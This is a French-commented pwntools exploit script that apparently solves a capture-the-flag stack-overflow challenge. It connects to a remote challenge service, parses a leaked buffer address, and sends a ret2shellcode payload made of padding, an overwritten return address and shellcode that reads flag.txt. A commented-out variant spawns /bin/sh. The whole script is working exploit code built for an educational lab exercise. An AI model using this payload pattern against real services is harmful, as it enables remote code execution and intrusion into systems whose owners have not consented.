from pwn import *

context.update(arch='amd64')
# Création de la connexion avec le service distant
p = remote("cytech.tcdn.casa", 4106)

#execution en local
#p = process('./1-stack-06-ret2sc-simple')

# attacher gdb
#p = gdb.debug('./1-stack-06-ret2sc-simple', '''''')

# Shellcode pour exécuter /bin/sh en x86_64
#shellcode = (asm(shellcraft.sh()))

shellcode=(asm(shellcraft.cat("flag.txt")))

# Récupérer l'adresse du buffer
p.recvuntil("is at ".encode('utf-8'))
address_line = p.recvline().strip()  # Récupérer la ligne entière contenant l'adresse

print(address_line)

return_address = int(address_line, 16) + 35

payload = cyclic(27) + p64(return_address) + shellcode

# Envoyer le payload
p.sendline(payload)

# Interagir avec le shell obtenu
p.interactive()
